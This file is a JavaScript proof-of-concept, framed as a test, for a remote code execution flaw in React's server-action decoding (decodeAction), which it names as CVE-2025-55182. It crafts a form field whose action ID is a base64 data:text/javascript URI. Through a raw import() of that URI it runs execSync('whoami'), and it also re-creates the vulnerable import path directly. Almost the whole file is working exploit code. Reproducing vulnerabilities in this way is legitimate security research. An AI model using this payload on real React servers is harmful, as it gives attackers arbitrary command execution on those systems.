/**
 * Test: Real CVE-2025-55182 exploit via decodeAction
 *
 * The exploit path:
 * 1. Send multipart form with $ACTION_ID_data:text/javascript;base64,CODE#default
 * 2. decodeAction extracts the ID
 * 3. loadServerReference -> resolveServerReference extracts specifier
 * 4. preloadModule calls import(specifier)
 * 5. Node.js evaluates the data URI -> RCE!
 *
 * Key: Using the UNBUNDLED version which has the raw import()
 */

'use strict';

// We need to use the unbundled version!
const path = require('path');

// Setup mocks for the unbundled version
process.env.NODE_ENV = 'production';
require.cache[require.resolve('react')] = {
  id: require.resolve('react'),
  filename: require.resolve('react'),
  loaded: true,
  exports: {
    __SERVER_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE: { H: null, A: null },
    version: '19.0.0',
  }
};

console.log('='.repeat(60));
console.log('Test: Real CVE-2025-55182 Exploit');
console.log('='.repeat(60));
console.log('');

// Try to load the unbundled version
let decodeAction;
try {
  // The vulnerable package path
  const unbundledPath = '/private/tmp/react-diff/vulnerable/package/cjs/react-server-dom-webpack-server.node.unbundled.production.js';
  const vulnerable = require(unbundledPath);
  decodeAction = vulnerable.decodeAction;
  console.log('[+] Loaded unbundled vulnerable version');
} catch (e) {
  console.log('[-] Failed to load unbundled version:', e.message);
  console.log('');
  console.log('Trying alternative approach...');

  // Direct test of the vulnerable pattern
  async function testDirectExploit() {
    console.log('');
    console.log('[1] Simulating resolveServerReference (unbundled):');

    // The unbundled resolveServerReference just parses the ID
    function resolveServerReference(bundlerConfig, id) {
      var idx = id.lastIndexOf("#");
      var specifier = id.slice(0, idx);
      var name = id.slice(idx + 1);
      return { specifier: specifier, name: name };
    }

    // The unbundled preloadModule does raw import()
    async function preloadModule(metadata) {
      console.log('    import(' + metadata.specifier.slice(0, 50) + '...)');
      return import(metadata.specifier);
    }

    // Craft the malicious action ID
    const rceCode = `
import { execSync } from 'node:child_process';
console.log('[RCE] Triggered during module import!');
const result = execSync('whoami').toString().trim();
console.log('[RCE] whoami =', result);
export default function action() { return 'Pwned by: ' + result; }
`;
    const base64 = Buffer.from(rceCode).toString('base64');
    const actionId = `data:text/javascript;base64,${base64}#default`;

    console.log('');
    console.log('[2] Malicious action ID:');
    console.log('    $ACTION_ID_' + actionId.slice(0, 60) + '...');
    console.log('');

    console.log('[3] What decodeAction does:');
    console.log('    1. Extracts ID from $ACTION_ID_{id}');
    console.log('    2. Calls loadServerReference(manifest, id, null)');
    console.log('    3. loadServerReference -> resolveServerReference(manifest, id)');
    console.log('    4. preloadModule(serverReference)');
    console.log('    5. import(specifier) -> RCE!');
    console.log('');

    console.log('[4] Executing exploit:');
    console.log('');

    const serverRef = resolveServerReference(null, actionId);
    console.log('    Parsed reference:');
    console.log('      specifier:', serverRef.specifier.slice(0, 50) + '...');
    console.log('      name:', serverRef.name);
    console.log('');

    const module = await preloadModule(serverRef);
    console.log('');
    console.log('[5] Module loaded!');
    console.log('    Module:', module);
    console.log('    Calling module.default():', module.default());
  }

  testDirectExploit().catch(console.error);
  return;
}

async function testWithVulnerablePackage() {
  console.log('');
  console.log('[1] Creating malicious FormData:');

  // The exploit payload
  const rceCode = `
import { execSync } from 'node:child_process';
console.log('[RCE] Triggered via decodeAction!');
export default function() { return 'pwned'; }
`;
  const base64 = Buffer.from(rceCode).toString('base64');
  const actionId = `data:text/javascript;base64,${base64}#default`;

  // Create form data like the article describes
  const formData = new Map();
  formData.set(`$ACTION_ID_${actionId}`, 'ignored');
  formData.forEach = function(cb) { for (const [k, v] of this.entries()) cb(v, k); };

  console.log('    Field: $ACTION_ID_' + actionId.slice(0, 40) + '...');
  console.log('');

  console.log('[2] Calling decodeAction:');
  console.log('');

  try {
    // Empty manifest - unbundled version doesn't check it!
    const result = await decodeAction(formData, {});
    console.log('[3] Result:', result);
  } catch (e) {
    console.log('[3] Error:', e.message);
  }
}

testWithVulnerablePackage().catch(console.error);
